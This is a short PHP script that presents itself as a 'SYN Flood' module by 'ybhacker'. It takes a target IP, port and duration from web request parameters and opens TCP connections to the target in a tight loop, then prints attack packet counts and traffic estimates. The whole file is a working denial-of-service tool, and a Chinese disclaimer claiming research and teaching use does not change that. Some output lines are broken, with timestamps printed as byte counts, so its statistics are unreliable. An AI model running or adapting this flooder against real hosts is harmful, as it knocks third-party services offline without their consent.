
<?php
//deins_asy.php?ip=192.168.0.112&port=80&time=10
ini_set("display_errors", "Off");
$packets = 0;
$ip = $_REQUEST['ip'];
$port = $_REQUEST['port'];
set_time_limit(0);
ignore_user_abort(FALSE);
$exec_time = $_REQUEST['time'];
$time = time();
print "状态 : 正常运行中.....<br>";
$max_time = $time+$exec_time;
while(1){
$packets++;
        if(time() > $max_time){
                break;
        }
        
        $fp = fsockopen("tcp://$ip", $port,$errno,$errstr,0);		
}
echo "================================================<br>";
echo "  <font color=blue>www.baidu.com<br>";
echo "  SYN Flood 模块<br>";
echo "  作者：ybhacker<br>";
echo "  警告：本程序带有攻击性,仅供安全研究与教学之用,风险自负!</font><br>";
echo "================================================<br><br>";
echo "  攻击包总数：<font color=Red><span class=\"text\">".$packets." 个数据包</span><br><br></font>";
echo "	攻击总流量：<font color=Red><span class=\"text\">".round(($packets*65*8)/(1024*1024),2)." Mbps</span><br><br></font>";
echo "  攻击总字节：<font color=Red><span class=\"text\">".time('h:i:s')." 字节</span><br><br></font>";
echo "Packet complete at ".time('h:i:s')." with $packets (" .round(($packets*65*8)/(1024*1024),2). " Mbps) packets averaging ". round($packets/$exec_time, 2) . " packets/s \n";
?>